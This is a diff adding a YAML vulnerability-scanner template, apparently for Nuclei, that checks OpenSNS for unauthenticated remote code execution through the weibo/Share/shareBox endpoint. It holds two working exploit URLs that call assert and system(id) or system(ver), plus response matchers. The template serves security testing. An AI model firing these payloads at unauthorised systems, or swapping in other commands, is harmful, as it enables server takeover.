@@ -1,0 +1,34 @@
+id: opensns-rce
+
+info:
+  name: OpenSNS Remote Code Execution Vulnerability
+  author: gy741
+  severity: critical
+  description: A vulnerability in OpenSNS allows remote unauthenticated attackers to cause the product to execute arbitrary code via the 'shareBox' endpoint.
+  reference:
+    - http://www.0dayhack.net/index.php/2417/
+    - https://www.pwnwiki.org/index.php?title=OpenSNS_%E9%81%A0%E7%A8%8B%E4%BB%A3%E7%A2%BC%E5%9F%B7%E8%A1%8C%E6%BC%8F%E6%B4%9E
+  tags: opensns,rce
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(ver)'
+      - '{{BaseURL}}/index.php?s=weibo/Share/shareBox&query=app=Common%26model=Schedule%26method=runSchedule%26id[status]=1%26id[method]=Schedule-%3E_validationFieldItem%26id[4]=function%26[6][]=%26id[0]=cmd%26id[1]=assert%26id[args]=cmd=system(id)'
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "((u|g)id=)"
+          - "Microsoft Windows"
+        part: body
+        condition: or
+
+      - type: word
+        words:
+          - "/Application/"
+
+      - type: status
+        status:
+          - 200
